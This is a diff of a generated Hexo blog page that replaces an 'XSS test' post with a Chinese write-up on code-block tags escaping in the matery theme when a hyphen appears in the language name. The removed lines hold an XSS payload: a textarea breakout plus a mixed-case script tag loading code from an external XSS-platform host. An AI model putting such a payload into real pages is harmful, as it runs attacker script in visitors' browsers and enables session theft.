@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="xss测试, Atmujie">
+    <meta name="keywords" content="关于hexo博客matery主题代码块的标签逃逸问题, Atmujie">
     <meta name="description" content="有一美人兮，见之不忘，一日不见兮，思之如狂；">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>xss测试 | Atmujie</title>
+    <title>关于hexo博客matery主题代码块的标签逃逸问题 | Atmujie</title>
     <link rel="icon" type="image/png" href="/weblogo.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -207,12 +207,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">xss测试</h1>
+                    <h1 class="description center-align post-title">关于hexo博客matery主题代码块的标签逃逸问题</h1>
                 </div>
             </div>
         </div>
@@ -361,21 +361,45 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <pre><code>]
+                <h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>水篇博客，就目前来说，这就是一个小问题，没啥利用点</p>
+<p>本来打算交补天，在按提交的一瞬间，我感觉水补天好像不太好，就COPY了来水博客了</p>
+<p>发现的东西不写不舒服</p>
+<p><strong>先放一些代码</strong></p>
+<pre><code>]
 &lt;h1&gt;&amp;aaa;&lt;/h1&gt;
-&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=http://xssye.com/UAQg&gt;&lt;/sCrIpT&gt;
 </code></pre>
 <pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd">]
 <h1>&aaa;</h1>
-</tExtArEa>'"><sCRiPt sRC=http://xssye.com/UAQg></sCrIpT>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <pre class="line-numbers language-x-xxx"><code class="language-x-xxx">]
 <h1>&aaa;</h1>
-</tExtArEa>'"><sCRiPt sRC=http://xssye.com/UAQg></sCrIpT>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><h1>&aaa;</h1>
-</tExtArEa>'"><sCRiPt sRC=http://xssye.com/UAQg></sCrIpT>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><h1>&aaa;</h1>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>有没有人以为是我写错了？</strong></p>
+<p><strong>并不是</strong></p>
+<p><strong>它本来是这个样子</strong></p>
+<p><img src="image-20211212121113158.png" alt="image-20211212121113158"></p>
+<p>原因我在下面来废话</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>起因是我学完xxe后写了一篇博客，hexo网站，matery 主题</p>
+<p>今天去看的时候，发现代码块里的东西不正常</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE message [
+&lt;!ELEMENT message (#PCDATA)&gt;
+&lt;!ENTITY aaa &quot;135601360123502401401250&quot;&gt;
+]&gt;
+&lt;message&gt;&amp;aaa;&lt;/message&gt;
+</code></pre>
+<p>这是本来要传的代码，传上去成了</p>
+<p><img src="https://shs3.b.qianxin.com/butian_public/f154678484b1f7daaeac2ebfb69fbd6ddc8a1e8cb2688.png" alt="image.png"></p>
+<p>所以我针对这个问题展开了测试</p>
+<p>最后发现在选择语言处出现 “ - ”时，整个代码块的标签都会逃逸</p>
+<pre><code>&lt;h1&gt;&amp;aaa;&lt;/h1&gt; // 重点是选择语言处要有 - 
+</code></pre>
+<p><img src="https://shs3.b.qianxin.com/butian_public/f8563243463359920d9bbb2f0b974ec7c489fe6f86c62.png" alt="image.png"></p>
+<p>更换hexo 主题后没有这类问题，判断应该只是matery的问题，当然也可能是在美化博客的过程中出现的问题</p>
+<p>太菜没那审计hexo底层的本事，也没时间去深挖了，所以就浅显的测了测</p>
+<p>水完了，继续学习</p>
 
             </div>
             <hr/>
@@ -401,7 +425,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://atmujie.github.io/2021/12/12/xss%E6%B5%8B%E8%AF%95/">http://atmujie.github.io/2021/12/12/xss%E6%B5%8B%E8%AF%95/</a>
+                    <a href="http://atmujie.github.io/2021/12/12/%E5%85%B3%E4%BA%8Ehexo%E5%8D%9A%E5%AE%A2matery%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E5%9D%97%E7%9A%84%E6%A0%87%E7%AD%BE%E9%80%83%E9%80%B8%E9%97%AE%E9%A2%98/">http://atmujie.github.io/2021/12/12/%E5%85%B3%E4%BA%8Ehexo%E5%8D%9A%E5%AE%A2matery%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E5%9D%97%E7%9A%84%E6%A0%87%E7%AD%BE%E9%80%83%E9%80%B8%E9%97%AE%E9%A2%98/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -480,9 +504,9 @@
 
 <script type="text/javascript">
     disqus_config = function () {
-        this.page.url = 'http://atmujie.github.io/2021/12/12/xss%E6%B5%8B%E8%AF%95/';
-        this.page.identifier = '/2021/12/12/xss%E6%B5%8B%E8%AF%95/';
-        this.page.title = 'xss测试';
+        this.page.url = 'http://atmujie.github.io/2021/12/12/%E5%85%B3%E4%BA%8Ehexo%E5%8D%9A%E5%AE%A2matery%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E5%9D%97%E7%9A%84%E6%A0%87%E7%AD%BE%E9%80%83%E9%80%B8%E9%97%AE%E9%A2%98/';
+        this.page.identifier = '/2021/12/12/%E5%85%B3%E4%BA%8Ehexo%E5%8D%9A%E5%AE%A2matery%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E5%9D%97%E7%9A%84%E6%A0%87%E7%AD%BE%E9%80%83%E9%80%B8%E9%97%AE%E9%A2%98/';
+        this.page.title = '关于hexo博客matery主题代码块的标签逃逸问题';
     };
     let disqus_shortname = '';
 
@@ -776,13 +800,13 @@
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2021/12/12/xss%E6%B5%8B%E8%AF%95/">
+                <a href="/2021/12/12/%E5%85%B3%E4%BA%8Ehexo%E5%8D%9A%E5%AE%A2matery%E4%B8%BB%E9%A2%98%E4%BB%A3%E7%A0%81%E5%9D%97%E7%9A%84%E6%A0%87%E7%AD%BE%E9%80%83%E9%80%B8%E9%97%AE%E9%A2%98/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="xss测试">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="关于hexo博客matery主题代码块的标签逃逸问题">
                         
-                        <span class="card-title">xss测试</span>
+                        <span class="card-title">关于hexo博客matery主题代码块的标签逃逸问题</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
